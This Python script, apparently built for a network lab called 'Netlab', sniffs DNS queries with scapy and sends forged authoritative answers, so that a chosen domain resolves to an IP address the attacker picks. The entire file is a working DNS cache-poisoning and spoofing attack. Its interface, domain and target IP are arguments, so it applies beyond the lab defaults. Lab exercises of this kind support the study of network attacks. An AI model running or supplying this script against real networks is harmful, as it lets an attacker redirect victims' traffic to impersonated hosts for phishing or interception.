#!/usr/bin/env python3
"""DNS response spoofing for target.lab in Netlab."""

from __future__ import annotations

import argparse
from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send, sniff  # type: ignore


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Netlab DNS poison")
    p.add_argument("--iface", default="veth-atk")
    p.add_argument("--domain", default="target.lab")
    p.add_argument("--spoof-ip", default="10.0.0.2")
    p.add_argument("--filter", default="udp and dst port 53")
    return p.parse_args()


def qname_to_text(raw_qname: bytes) -> str:
    return raw_qname.decode(errors="ignore").rstrip(".")


def poison(pkt, domain: str, spoof_ip: str) -> None:
    if not pkt.haslayer(DNS) or not pkt.haslayer(IP) or not pkt.haslayer(UDP):
        return

    dns = pkt[DNS]
    if dns.qr != 0 or dns.qd is None or not pkt.haslayer(DNSQR):
        return

    query = qname_to_text(pkt[DNSQR].qname)
    if query != domain:
        return

    print(f"[dns-poison] intercept query {query} from {pkt[IP].src}")

    response = (
        IP(src=pkt[IP].dst, dst=pkt[IP].src)
        / UDP(sport=53, dport=pkt[UDP].sport)
        / DNS(
            id=dns.id,
            qr=1,
            aa=1,
            qd=dns.qd,
            an=DNSRR(rrname=pkt[DNSQR].qname, ttl=60, rdata=spoof_ip),
        )
    )
    send(response, verbose=False)
    print(f"[dns-poison] sent spoofed answer {domain} -> {spoof_ip}")


def main() -> None:
    args = parse_args()
    print(f"[dns-poison] iface={args.iface} domain={args.domain} spoof_ip={args.spoof_ip}")
    sniff(
        iface=args.iface,
        filter=args.filter,
        store=False,
        prn=lambda pkt: poison(pkt, args.domain, args.spoof_ip),
    )


if __name__ == "__main__":
    main()